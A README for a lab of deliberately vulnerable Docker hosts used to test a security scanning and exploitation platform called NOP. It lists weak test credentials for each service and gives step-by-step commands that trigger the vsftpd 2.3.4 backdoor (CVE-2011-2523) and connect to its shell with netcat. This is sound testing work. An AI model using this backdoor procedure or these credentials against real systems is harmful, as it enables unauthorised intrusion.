# Test Environment - Live Test Hosts

## Overview
This directory contains live test hosts for comprehensive feature validation. Each service runs in an isolated Docker container within the `test-network` (172.21.0.0/16).

## Quick Start

```bash
# Start all test hosts
docker compose up -d

# Verify all hosts are running
../validate-test-hosts.sh

# View logs for specific service
docker compose logs -f ssh-server
```

## Test Host Configuration

### Network Architecture
```
172.21.0.0/16 (test-network)
├── 172.21.0.10  SSH Server (Port 22)
├── 172.21.0.20  Web Server (Port 80)
├── 172.21.0.30  FTP Server (Port 21)
├── 172.21.0.40  MySQL Server (Port 3306)
├── 172.21.0.50  VNC Server (Port 5900)
├── 172.21.0.60  RDP Server (Port 3389)
├── 172.21.0.70  SMB Server (Port 445)
└── 172.21.0.100 Agent Test Host
```

## Current Vulnerable Targets

### 1. SSH Server (172.21.0.10)
**Container**: `vulnerable-ssh`  
**Port**: 22 (mapped to 2223 on host)  
**Image**: Alpine Linux with OpenSSH

**Credentials**:
- User: `testuser` / Password: `testpass123`
- User: `admin` / Password: `admin123` (sudo access)
- User: `root` / Password: `rootpass123`

**Features**:
- Multiple user accounts for testing
- Pre-populated test files in home directories
- Test scripts for command execution validation

**How to Test**:
```bash
# Connect via SSH
ssh testuser@172.21.0.10 -p 22
# or from host
ssh testuser@localhost -p 2223

# Test file operations
ls -la ~/documents/
cat ~/documents/readme.txt
./test.sh
```

### 2. Web Server (172.21.0.20)
**Container**: `vulnerable-web`  
**Port**: 80 (mapped to 8080 on host)  
**Image**: Apache HTTP Server

**How to Test**:
```bash
# Access via browser
curl http://172.21.0.20:80
# or from host
curl http://localhost:8080
```

### 3. FTP Server (172.21.0.30)
**Container**: `vulnerable-ftp`  
**Port**: 21 (mapped to 2121 on host)  
**Passive Ports**: 21100-21110

**Credentials**:
- User: `ftpuser` / Password: `ftp123`

**How to Test**:
```bash
# Connect via FTP
ftp 172.21.0.10
# Enter credentials: ftpuser / ftp123
ls
pwd
quit
```

### 4. vsftpd 2.3.4 BACKDOOR - CVE-2011-2523 (VULNERABLE TARGET FOR TESTING)
**Container**: `vsftpd-2.3.4-backdoor`  
**IP**: 172.21.0.25  
**Port**: 21 (mapped to 2121 on host)  
**Backdoor Port**: 6200  
**CVSS**: 10.0 (Critical)

**Details**:
- vsftpd version 2.3.4 with intentional backdoor
- Triggered by username containing `:)` emoticon
- Opens shell on port 6200

**How to Test**:
1. **Start the container**:
   ```bash
   docker compose up -d vsftpd-backdoor
   ```

2. **Verify it's running**:
   ```bash
   nc -zv 172.21.0.25 21
   ```

3. **Trigger backdoor manually**:
   ```bash
   # Connect to FTP and use username with :)
   telnet 172.21.0.25 21
   USER test:)
   PASS anything
   # Backdoor opens on port 6200
   
   # Connect to backdoor shell
   nc 172.21.0.25 6200
   id
   ```

4. **Scan with NOP**:
   - Navigate to Scans page
   - Create new scan with target: `172.21.0.25`
   - Run vulnerability scan
   - Should detect CVE-2011-2523 with exploit available

5. **Exploit with NOP**:
   - Go to Vulnerabilities page
   - Select vsftpd-backdoor asset
   - Click "Exploit" on CVE-2011-2523
   - Execute and verify shell connection

### 5. MySQL Database (172.21.0.40)
**Container**: `vulnerable-db`  
**Port**: 3306 (mapped to 3307 on host)  
**Image**: MySQL 5.7

**Credentials**:
- User: `root` / Password: `root123`
- User: `dbuser` / Password: `dbpass123`
- Database: `testdb`

**How to Test**:
```bash
# Connect via MySQL client
mysql -h 172.21.0.40 -u dbuser -p testdb
# Enter password: dbpass123

# or from host
mysql -h 127.0.0.1 -P 3307 -u dbuser -p testdb
```

### 6. VNC Server (172.21.0.50)
**Container**: `vulnerable-vnc`  
**Port**: 5900 (mapped to 5901 on host)  
**Image**: Ubuntu 20.04 with X11VNC

**Credentials**:
- VNC Password: `password`
- User: `vncuser` / Password: `vnc123`

**Features**:
- Xvfb virtual framebuffer
- Openbox window manager
- xterm terminal pre-opened
- Real VNC protocol for testing

**How to Test**:
```bash
# Connect via VNC client
vncviewer 172.21.0.50:5900
# Enter password: password

# or from host
vncviewer localhost:5901
```

### 7. RDP Server (172.21.0.60)
**Container**: `vulnerable-rdp`  
**Port**: 3389 (mapped to 3390 on host)  
**Image**: Ubuntu 20.04 with XRDP

**Credentials**:
- User: `rdpuser` / Password: `rdp123`

**Features**:
- XRDP server with xorgxrdp backend
- XFCE desktop environment
- Configured for Guacamole 1.6.0 compatibility
- Security layer set to `negotiate` for maximum compatibility

**How to Test**:
```bash
# Connect via RDP client
rdesktop 172.21.0.60:3389
# or
xfreerdp /v:172.21.0.60 /u:rdpuser /p:rdp123

# from host
xfreerdp /v:localhost:3390 /u:rdpuser /p:rdp123
```

### 8. SMB/File Server (172.21.0.70)
**Container**: `vulnerable-smb`  
**Port**: 445 (mapped to 1445 on host)  
**NetBIOS**: 139 (mapped to 1139 on host)  
**Image**: Samba file server

**Credentials**:
- User: `smbuser` / Password: `smbpass123`

**How to Test**:
```bash
# List shares
smbclient -L //172.21.0.70 -U smbuser
# Enter password: smbpass123

# Connect to share
smbclient //172.21.0.70/share -U smbuser
```

### 9. Agent Test Host (172.21.0.100)
**Container**: `nop-agent-test`  
**Networks**: 
- `test-network` (172.21.0.100)
- `nop_nop-internal` (172.28.0.100)

**Purpose**: Test agent deployment and C2 communication

## Network Configuration

### Docker Networks
```yaml
networks:
  test-network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.21.0.0/16
          gateway: 172.21.0.1
  nop_nop-internal:
    external: true  # Connects to NOP platform
```

### Port Mappings
| Service | Internal | External (Host) |
|---------|----------|-----------------|
| SSH | 172.21.0.10:22 | localhost:2223 |
| Web | 172.21.0.20:80 | localhost:8080 |
| FTP | 172.21.0.30:21 | localhost:2121 |
| vsftpd | 172.21.0.25:21 | localhost:2121 |
| MySQL | 172.21.0.40:3306 | localhost:3307 |
| VNC | 172.21.0.50:5900 | localhost:5901 |
| RDP | 172.21.0.60:3389 | localhost:3390 |
| SMB | 172.21.0.70:445 | localhost:1445 |

## Security Warning

⚠️ **THESE ARE INTENTIONALLY VULNERABLE SYSTEMS**  

- **Only use in isolated test environment**
- **Never expose these containers to external networks**
- **Never use in production**
- **Some containers have known CVEs for testing purposes**
- **Credentials are intentionally weak**

## Management Commands

```bash
# Start all services
docker compose up -d

# Start specific service
docker compose up -d ssh-server

# Stop all services
docker compose down

# Restart service
docker compose restart ssh-server

# View logs
docker compose logs -f ssh-server

# Execute command in container
docker compose exec ssh-server sh

# Rebuild service
docker compose build ssh-server
docker compose up -d --build ssh-server

# Remove all containers and volumes
docker compose down -v
```

## Validation

```bash
# Validate all hosts
../validate-test-hosts.sh

# Manual validation
nc -zv 172.21.0.10 22   # SSH
nc -zv 172.21.0.20 80   # Web
nc -zv 172.21.0.30 21   # FTP
nc -zv 172.21.0.40 3306 # MySQL
nc -zv 172.21.0.50 5900 # VNC
nc -zv 172.21.0.60 3389 # RDP
nc -zv 172.21.0.70 445  # SMB
```

## Troubleshooting

### Container won't start
```bash
# Check logs
docker compose logs service-name

# Rebuild container
docker compose build --no-cache service-name
docker compose up -d service-name
```

### Network connectivity issues
```bash
# Inspect network
docker network inspect test-network

# Check if container is on network
docker inspect container-name | grep -A 10 Networks

# Restart networking
docker compose down
docker compose up -d
```

### Port conflicts
```bash
# Check what's using port
lsof -i :PORT
netstat -tuln | grep PORT

# Change port mapping in docker-compose.yml
```

## Integration with NOP

These test hosts are designed to work with NOP's comprehensive test suite:

1. **Asset Discovery**: NOP should discover all 7+ hosts on 172.21.0.0/24
2. **Port Scanning**: Each service should be detected on its respective port
3. **Service Detection**: Banners and versions should be identified
4. **Credential Validation**: Stored credentials should successfully authenticate
5. **Remote Access**: SSH, VNC, RDP connections should establish
6. **Vulnerability Scanning**: Known vulnerabilities should be detected
7. **Exploitation**: Test exploits should execute successfully
8. **Agent Deployment**: Agent should deploy and communicate back

## Testing Workflow

1. **Start Test Environment**:
   ```bash
   docker compose up -d
   ../validate-test-hosts.sh
   ```

2. **Start NOP Platform**:
   ```bash
   cd ..
   docker compose up -d
   ```

3. **Run Test Suite**:
   ```bash
   ./run-comprehensive-tests.sh
   # or
   npm run test:full
   ```

4. **Manual Testing**:
   - Login to NOP: http://localhost:12000
   - Navigate to Assets → Discover → Scan 172.21.0.0/24
   - View discovered hosts
   - Add credentials from this README
   - Test connections
   - Run workflows
   - Execute exploits

## Cleanup

```bash
# Stop and remove all test containers
docker compose down

# Remove volumes (database data, etc.)
docker compose down -v

# Remove all images
docker compose down --rmi all

# Full cleanup
docker compose down -v --rmi all --remove-orphans
```

## Contributing

To add a new test host:

1. Create directory: `test-environment/service-name/`
2. Add `Dockerfile`
3. Configure service in `docker-compose.yml`
4. Assign static IP in 172.21.0.0/16 range
5. Document credentials and usage in this README
6. Update `validate-test-hosts.sh`
7. Add tests in `e2e/tests/`

## See Also

- [Comprehensive Test Suite Documentation](../e2e/TEST_SUITE_README.md)
- [Main NOP README](../README.md)
- [Playwright Tests](../e2e/tests/)

